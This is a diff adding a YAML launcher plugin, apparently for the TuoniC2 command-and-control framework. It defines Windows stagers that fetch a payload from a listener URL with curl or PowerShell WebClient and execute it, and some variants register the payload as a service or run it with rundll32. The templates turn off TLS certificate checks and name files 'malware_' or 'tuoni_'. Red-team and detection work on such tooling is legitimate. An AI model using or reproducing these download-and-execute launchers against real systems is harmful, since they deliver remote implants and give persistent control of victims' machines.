@@ -1,0 +1,108 @@
+---
+name: default-shelldot-launchers
+version: 0.4.0
+description: Default Launchers Plugin for TuoniC2 by ShellDot
+type: launcher
+launchers:
+  - name: "Download and Execute in CMD (File)"
+    match:
+      type: ["EXECUTABLE", "DEBUG_EXECUTABLE"]
+      arch: ["x64", "x86"]
+      platform: ["windows"]
+    type: file
+    path: "template.multi.curl-exe.cmd"
+    args:
+      - name: url
+      - name: filename
+      - name: isHTTPS
+        fn: |
+          listener.configuration.https ? "-k" : " ";
+  - name: "Download and Execute in CMD (String)"
+    match:
+      type: ["EXECUTABLE", "DEBUG_EXECUTABLE"]
+      arch: ["x64", "x86"]
+      platform: ["windows"]
+    type: string
+    templateString: "curl.exe %%isHTTPS%% %%url%% -o %%filename%% && %%filename%%"
+    args:
+      - name: url
+      - name: isHTTPS
+        fn: | 
+          listener.configuration.https ? "-k" : "";
+      - name: filename
+  - name: "Download and Execute in CMD (Random Filename)"
+    match:
+      type: ["EXECUTABLE", "DEBUG_EXECUTABLE"]
+      arch: ["x64", "x86"]
+      platform: ["windows"]
+    type: string
+    templateString: "curl.exe %%isHTTPS%% %%url%% -o %%filename%% && %%filename%%"
+    args:
+      - name: url
+      - name: isHTTPS
+        fn: |
+          listener.configuration.https ? "-k" : "";
+      - name: filename
+        fn: |
+          const timestamp = new Date().getTime();
+          const payloadType = payload.configuration.type;
+          const fileExtension = payloadsStore().extensionMap.get(payloadType);
+          `malware_${timestamp}.${fileExtension}`;
+  - name: "Download and Execute in PowerShell (File)"
+    match:
+      type: ["EXECUTABLE", "DEBUG_EXECUTABLE"]
+      arch: ["x64", "x86"]
+      platform: ["windows"]
+    type: file
+    path: "template.multi.powershell.ps1"
+    args:
+      - name: url
+      - name: isHTTPS
+        fn: |
+          listener.configuration.https ? "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" : "";
+      - name: filename
+
+  - name: "Download and Execute in PowerShell (ALL)"
+    match:
+      type: ["EXECUTABLE", "DEBUG_EXECUTABLE", "SERVICE", "DLL"]
+      arch: ["x64", "x86"]
+      platform: ["windows"]
+    type: string
+    templateString: |
+      %%isHTTPS%% (New-Object System.Net.WebClient).DownloadFile('%%url%%', '%%filename%%');%%execution%%
+    args:
+      - name: url
+      - name: isHTTPS
+        fn: |
+          listener.configuration.https ? "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" : "";
+      - name: filename
+        fn: |
+          const timestamp = new Date().getTime();
+          const payloadType = payload.configuration.type;
+          const fileExtension = payloadsStore().extensionMap.get(payloadType);
+          `tuoni_${timestamp}.${fileExtension}`;
+      - name: execution
+        fn: |
+          const payloadType = payload.configuration.type;
+          const timestamp = new Date().getTime();
+          const execution = {
+            EXECUTABLE: (filename) => `Start-Process ${filename}`,
+            DEBUG_EXECUTABLE: (filename) => `Start-Process ${filename}`,
+            SERVICE: (filename) =>
+              `New-Service -Name MyService${timestamp} -BinaryPathName (Resolve-Path ${filename}); Start-Service -Name MyService${timestamp}`,
+            DLL: (filename) => `runDll32 ${filename},bob`,
+            SHELLCODE: (filename) => `# SHELLCODE NOT SUPPORTED YET`,
+          };
+          execution[payloadType](argumentsPluginInterface['filename']);
+  - name: "Download and Execute in PowerShell (shellcode)"
+    match:
+      type: ["SHELLCODE"]
+      arch: ["x64", "x86"]
+      platform: ["windows"]
+    type: file
+    path: "template.multi.shellcode.powershell.ps1"
+    args:
+      - name: url
+      - name: isHTTPS
+        fn: |
+          listener.configuration.https ? "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" : "";
